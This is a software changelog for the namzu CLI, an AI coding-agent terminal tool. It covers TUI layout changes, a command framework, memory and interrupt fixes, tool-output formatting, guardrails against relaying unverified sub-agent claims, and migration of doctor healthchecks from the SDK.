  **Live verification:** on this machine, `namzu` now auto-detects the Claude Code OAuth credential from the Keychain, picker shows `Anthropic (Claude)  keychain · Claude Code-credentials  ← current` after first pick, and `provider.chatStream()` constructs through the Bearer-auth path with the required beta header.

- deb6650: **The banner now shows an ASCII "namzu" wordmark instead of the mascot glyph.**

  The header's flower-face mascot is replaced by a compact three-row ASCII "namzu" wordmark that sits beside the version / provider / path block and keeps the existing alignment. On terminals too narrow for it, the banner falls back to the single `❀` bloom mark with the "Cogitave Namzu" label as before.

- a33fa55: **M0 — CLI Bootstrap** (`ses_001-cli-bootstrap`)

  Turn `packages/cli` from a single-command stub into an extensible command shell. No new user-visible feature beyond what already shipped (`doctor` behavior is unchanged); every later milestone (M1–M7) now has a place to plug in.

  - **Command framework:** Commander.js wires subcommand routing, `--help`, `--version`. Each command is a `CommandDef` (name, description, optional passThrough, handler) registered through a thin adapter, so swapping the framework later is a one-file change.
  - **Doctor preserved:** the legacy `runDoctorCommand(args)` signature and its `--json`/`--category`/etc. flags are forwarded unparsed (`passThrough: true`); the doctor JSON shape and exit codes are unchanged.
  - **Output formatters:** new `--format <text|json|yaml>` and `--quiet` global flags. Stubs print structured payloads through a `Formatter` (text/json/yaml). Doctor keeps its own `--json` for now.
  - **Config cascade:** `loadConfig()` resolves CLI flags > `NAMZU_*` env > `./namzu.config.json` > `~/.namzu/config.yaml` > defaults. Schema is intentionally minimal (`format`, `quiet`) — milestones populate it as concrete settings land.
  - **Stub commands:** `chat` (M3), `tools` (M1), `providers` (M2), `skills` (M5), `serve` (M7) — each prints its milestone marker through the active formatter and exits 0.
  - **Tests:** `runCli`, formatter factory, and config cascade are covered; pre-M0 `doctor` tests are untouched and still pass.

  Exit codes follow sysexits: `0` OK, `1` doctor checks failed, `2` no config, `64` `EX_USAGE` (Commander parse errors), `70` `EX_SOFTWARE` (internal CLI error / doctor's pre-existing unknown-option path).

  New library exports: `runCli`, `registerAll`, `registerCommand`, `createFormatter`, `loadConfig`, `DEFAULT_CONFIG`, and the `CommandDef` / `CommandContext` / `Formatter` / `NamzuCliConfig` types.

- 142b695: **M0 hotfix** (`ses_002-clawtool-bridge`) — align CLI shape with the TUI-as-default product vision.

  - **Removed:** `namzu chat` stub command. The `chat` subcommand was a misread of the product shape: namzu's primary user surface is a TUI (like claude-code, gemini-cli, opencode, and hermes-agent's TUI), and the TUI **is** the chat. Having a separate `chat` subcommand framed the CLI as "command-first" when it's actually "TUI-first with utility subcommands".
  - **Added:** default behavior for `namzu` (no args) — prints a one-line placeholder (`namzu — TUI coming in M3. For utility subcommands run namzu --help.`) and exits 0. M3 will replace this with the actual Ink + React TUI launch.
  - `namzu --help` still lists the utility surface (`doctor`, `tools`, `providers`, `skills`, `serve`).

  Reference TUIs vendored at `cogitave.com/vendor/{google-gemini/gemini-cli, sst/opencode, NousResearch/hermes-agent}` guide the M3 shape: minimalist scrolling transcript + bottom composer + dialog overlays, slash-command registry, permission-with-inline-diff for tool calls.

  No library API changes; the doctor command and all M0 plumbing (Commander shell, output formatters, config cascade, sysexits mapping) remain identical.

- 38c4b62: Harden two paths flagged by an adversarial review: `ToolRegistry.searchDeferred` no longer over-activates deferred tools — batched-query tokens match the tool name only (not descriptions) and short/generic tokens like `clawtool` are ignored, so a common word can't activate the whole catalog. The dynamic `Agent` sub-agent now unregisters its per-call `dyn-N` definition in a `finally`, so long sessions don't leak persona registrations on success, failure, or throw.
- 2b08383: **Automatic context compression on long turns.** namzu now passes the SDK's structured compaction config to the agent loop, so very long, tool-heavy turns summarize old tool results/notes (keeping recent messages verbatim) instead of growing the context unbounded. Transparent for normal turns.
- 5b1fe2f: Markdown links (`[text](url)`) in assistant replies now render with the link text in the accent color (underlined) followed by the URL dimmed, instead of raw `[text](url)` syntax.
- c12cd19: The header now shows a little **namzu mascot** — a bloom flower over a friendly `•◡•` face, in the teal/green brand palette (a nod to Claude Code's mascot, themed to the namzu.ai flower) — beside the **Cogitave Namzu** name, version, provider · model, and working directory.
- 38c4b62: Stop bridging clawtool's `Agent*` persona-file tools (`AgentNew`, `AgentList`, `AgentDetect`) into the agent. Those write Claude-Code-style definitions into `.claude/agents/` — a different, redundant mechanism that polluted Claude Code's directory and confused the model alongside namzu's own in-memory dynamic sub-agents. namzu owns sub-agent definition + dispatch natively, so these clawtool tools are excluded from the bridged catalog.
- 38c4b62: Harden namzu's anti-fabrication guardrails against relaying another agent's claims as fact. A reply from a tool that delegates to a separate agent (clawtool `agent.run`, an A2A `tasks/send`, a remote peer) is that agent's unverified narrative — it can hallucinate (e.g. claiming a Windows file write when the box is actually WSL2 Ubuntu). namzu is now instructed to treat such replies as claims, confirm them with a deterministic tool (a real shell, a file read) before reporting them as done, and never present another agent's prose as its own verified result.
- d6b5bc1: **Remove the legacy `append` file tool.** `AppendFileTool` is gone — it was already excluded from `getBuiltinTools()` (Claude Code's tool distribution has no `Append`), and appending is canonical `edit` with `insertLine: "end"`. The export is removed from the public surface; hosts that relied on it should switch to `edit`. namzu's CLI no longer needs to filter `append` out of its tool set.
- 38c4b62: Match completed tool calls strictly by `toolUseId` in the TUI. The tool-end handler fell back to "the first active tool" when no id matched, which under parallel tool calls attributed a result to the wrong call. Now an unmatched completion renders on its own line and never closes the wrong spinner.
- 5b62e04: **Tool output reads cleaner.** Bash results drop their `STDOUT:` / `STDERR:` section labels (the ✓/✗ glyph already signals success), and every collapsible tool block (output, diffs, sub-agent trees) is now framed by a dim left rule `▏`, the way Claude Code / Warp set tool output apart from the conversation.
- 88079b0: **Cleaner tool output in the transcript.**

  Tool results that come back as JSON (clawtool / MCP tools) no longer render as a raw one-line blob: a `{ output | result | content | text }` envelope is unwrapped to just its payload, and any other JSON is pretty-printed. The one-line `⎿` summary is derived the same way (the payload's first line, an error message, or a short key list) instead of a truncated JSON string — so a tool call reads at a glance.

- 38c4b62: `namzu tools ls` now hides the clawtool tools namzu excludes from the agent (the `.claude/agents` Agent\* family), so the listing reflects what the model can actually call instead of advertising bridged tools that are filtered out.
- 50e9cce: **Fix the long-session out-of-memory crash and the banner that drifted down the screen.**

  The transcript used to re-render its entire history on every frame (each spinner tick and streamed token), so a long conversation grew the render tree until Node aborted with a 4 GB heap out-of-memory. Finalized messages now render through Ink's `<Static>` — each line is printed to scrollback exactly once and never re-rendered — so memory and per-frame work stay bounded and the flicker is gone; only the in-progress reply stays live.

  The same change pins the header: because `<Static>` output is written above the live region, the banner (logo + provider + cwd) used to slide downward as messages accumulated. It is now the first static row, anchored to the top of the conversation.

- 6bd4c6b: **TUI redesign — cleaner, modern layout (gemini-cli / claude-code grade).**

  The interactive UI was visually heavy and cramped. It's been reworked to match the patterns of leading agent CLIs:

  - **Borderless, edge-to-edge transcript.** The round box around the message stream is gone; messages now use a two-column layout — a glyph gutter (`>` you, `✦` namzu, `⚙` tool, `·` system) plus the content, with wrapped lines hang-indented. No more redundant role-label line.
  - **Input field composer.** A rounded rule above and below the input (no side borders) with a `>` prompt and a dim placeholder, instead of a full box.
  - **One-line status bar.** The footer now truncates with an ellipsis on narrow terminals instead of wrapping into a mangled two lines, while keeping per-segment color.

  Pure visual changes; no behavior or API changes.

- a96b5c0: **Clean-screen takeover + a gradient NAMZU splash on launch.**

  namzu now clears the terminal (screen + scrollback) when it starts, so it opens on a fresh canvas instead of below leftover shell output — the clean "takeover" feel of claude-code / gemini-cli. It stays in the normal screen buffer, so native scrollback still works as the conversation grows.

  The startup banner is now an ASCII "NAMZU" wordmark rendered as a vertical teal→violet gradient, with a tagline, version, and connected provider beneath it. On narrow terminals (< 48 cols) it falls back to a compact `▲ namzu` mark.

- 54a3568: **Fix runaway interrupts and overflowing tool output.**

  - `Ctrl+C` while the agent is working now reliably stops it: it aborts the turn, **clears any queued messages** (so the queue can't immediately restart a new turn), and drops the abort handle so a second `Ctrl+C` arms exit. Previously, repeated presses spammed "Interrupted." lines and a queued message kept the agent running.
  - The user-interrupt no longer prints a redundant `Error: aborted` (the `Interrupted.` line covers it).
  - Tool diff/output lines now wrap to the terminal width instead of running off the right edge.

- Updated dependencies [542f057]
- Updated dependencies [df09910]
- Updated dependencies [140bcc0]
- Updated dependencies [2cf78ed]
- Updated dependencies [229ff8b]
- Updated dependencies [ea21863]
- Updated dependencies [38c4b62]
- Updated dependencies [265150b]
- Updated dependencies [a1c6694]
- Updated dependencies [52af97e]
- Updated dependencies [a71422a]
- Updated dependencies [d6b5bc1]
- Updated dependencies [8fd9349]
- Updated dependencies [63e44f7]
- Updated dependencies [63b4885]
- Updated dependencies [38c4b62]
- Updated dependencies [6b74cd0]
- Updated dependencies [d86b161]
  - @namzu/sdk@1.0.0
  - @namzu/anthropic@1.0.0
  - @namzu/ollama@1.0.0
  - @namzu/openai@1.0.0
  - @namzu/openrouter@1.0.0

## 0.0.3

### Patch Changes

- Updated dependencies [1df23b1]
  - @namzu/sdk@0.6.0

## 0.0.2

### Patch Changes

- Updated dependencies [2749d32]
  - @namzu/sdk@0.5.0

## 0.0.1

### Patch Changes

- 8f076e5: ses_007 Phase 5 — doctor runtime moved from `@namzu/sdk` to `@namzu/cli`. Architectural pivot: kernel = SDK (pure runtime primitives), operator surface = CLI (presentation + tooling).

  ## Breaking changes — `@namzu/sdk`

  The following 12 runtime exports have been **removed** from `@namzu/sdk`. They now live in `@namzu/cli`:

  - `doctor` (singleton), `DoctorRegistry`, `createDoctorRegistry`
  - `registerDoctorCheck`, `runDoctor`
  - `builtInDoctorChecks`
  - `sandboxPlatformCheck`, `cwdWritableCheck`, `tmpdirWritableCheck`
  - `vaultRegisteredCheck`, `providersRegisteredCheck`, `telemetryInstalledCheck`

  The `RunDoctorOptions` type has also been removed from `@namzu/sdk` exports.

  **What stays in `@namzu/sdk`:**

  - The protocol types — `DoctorCheck`, `DoctorCheckResult`, `DoctorCheckContext`, `DoctorCheckRecord`, `DoctorReport`, `DoctorStatus`, `DoctorCategory` — remain in `types/doctor/` so kernel components can implement custom checks against them.
  - `LLMProvider.doctorCheck?(): Promise<DoctorCheckResult>` — the kernel hook that lets a provider expose its own healthcheck stays on the interface.

  ## Migration

  If you were calling the doctor in your own process:

  ```diff
  - import { runDoctor, registerDoctorCheck } from '@namzu/sdk'
  + import { runDoctor, registerDoctorCheck } from '@namzu/cli'
  ```

  If you were running it from the command line:

  ```bash
  # Before — required a custom CLI bin or `pnpm dlx tsx packages/sdk/src/doctor/...`
  # After:
  pnpm dlx @namzu/cli doctor
  # or, after install: namzu doctor
  ```

  Custom check authors continue to import the protocol types from `@namzu/sdk`:

  ```ts
  import type { DoctorCheck, DoctorCheckResult } from "@namzu/sdk";
  import { registerDoctorCheck } from "@namzu/cli";

  const myCheck: DoctorCheck = {
    id: "app.db.reachable",
    category: "custom",
    run: async (): Promise<DoctorCheckResult> => {
      // your probe
    },
  };
  registerDoctorCheck(myCheck);
  ```

  ## New — `@namzu/cli` (initial public release)

  `@namzu/cli` v0.1.0 ships as a public package for the first time. Dual-purpose:

  - **Standalone bin** — `npx @namzu/cli doctor`, or after install: `namzu doctor`. Supports `--json`, `--verbose`, `--category <a,b,c>`, `--per-check-timeout <ms>`, `--wall-clock-timeout <ms>`. Sysexits-aligned exit codes (`0` ok, `1` fail, `2` no config, `70` internal error).
  - **Library** — `import { runDoctor, registerDoctorCheck, builtInDoctorChecks } from '@namzu/cli'` for embedded usage where consumer code wants to invoke the doctor in its own process so app-registered checks are visible.

  **What ships built-in:**

  - `sandbox.platform` (darwin sandbox-exec presence + win32 warn + linux/other inconclusive)
  - `runtime.cwd-writable` + `runtime.tmpdir-writable` (real `fs.access(W_OK)` probes)
  - `telemetry.installed` (dynamic-import probe for `@namzu/telemetry`)
  - `vault.registered` + `providers.registered` (intentionally inconclusive — consumers register their own walking their setup)

  **Why patch-bump-equivalent:** `@namzu/sdk: minor` carries the breaking removal (pre-1.0 cadence); `@namzu/cli: minor` carries the new package's first feature release. Together they make the next release a coordinated cut.

- 82220e3: Doctor — `runDoctor()` accepts streaming callbacks + cooperative cancellation (ses_013 Phase 1).

  Three new optional fields on `RunDoctorOptions`:

  - **`onCheckStart(check)`** — fires immediately before each check's `run()` is invoked.
  - **`onCheckComplete(record)`** — fires exactly once per check after its record is built (whether `pass`, `fail`, `inconclusive`, or `warn`). Defended against double-fire by the same `completed` map that pins the record.
  - **`signal?: AbortSignal`** — cooperative cancellation. When the signal aborts, in-flight checks stop being awaited; their records become `inconclusive` with an "aborted by signal" message. Completed records are preserved verbatim.

  Throwing callbacks are caught + logged + never affect the doctor run or the final `DoctorReport`.

  Substrate for the upcoming TUI mode (later patch in this same series), useful standalone for analytics or custom progress UIs.

  Internal: `packages/cli/tsconfig.json` adds `"jsx": "react-jsx"` + `"jsxImportSource": "react"` in preparation for the TUI's `.tsx` files. No `.tsx` files yet; typecheck still passes. Purely additive — no consumer behavior change.

- 0ba357d: Doctor registry — preserve completed records on wall-timeout + double-fire defense (ses_013 Phase 0).

  Two pre-existing bugs in `DoctorRegistry.run()` surfaced by the ses_013 codex adversarial review:

  - **Wall-timeout aggregation no longer erases completed records.** Before: when the wall-clock timer won the race, every check was mapped to `inconclusive`, even ones that already finished. Fast pass + slow timeout produced 0 pass + N inconclusive. After: only checks that haven't finished by the wall-clock deadline are marked `inconclusive`; completed records are preserved verbatim. Fast pass + slow timeout now correctly produces 1 pass + (N-1) inconclusive.
  - **Completion can no longer double-fire.** A check whose per-check timeout fired microseconds before/after the check itself resolved could produce duplicate records. Defended by an `if (completed.has(check.id)) return` guard inside the per-check callback. First record wins.

  No public API change — bug fix only. 4 new tests pin the corrected contract; suite total 22 → 26.

- Updated dependencies [aead3a8]
- Updated dependencies [8f076e5]
  - @namzu/sdk@0.4.5
